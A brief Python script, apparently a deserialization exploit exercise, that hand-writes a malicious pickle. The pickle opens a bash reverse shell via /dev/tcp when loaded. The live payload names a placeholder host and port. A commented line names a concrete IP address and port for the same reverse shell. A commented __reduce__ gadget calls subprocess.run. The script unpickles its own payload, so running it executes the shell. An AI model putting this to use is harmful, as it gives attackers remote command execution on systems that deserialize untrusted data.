import pickletools
import subprocess
import pickle
from typing import Any

# subprocess.run(["bash", "-c", "bash -i >& /dev/tcp/43.143.123.40/2333 0>&1"])

opcode = b'''csubprocess
run
(]S'bash'
aS'-c'
aS'bash -i >& /dev/tcp/vps/port 0>&1'
atR.
'''


# class A():
#     def __reduce__(self) -> str | tuple[Any, ...]:
#         return (__import__('subprocess').run, (['ls', '-l'], ))


# opcode = pickle.dumps(A())

pickletools.dis(opcode)
print(pickle.loads(opcode))
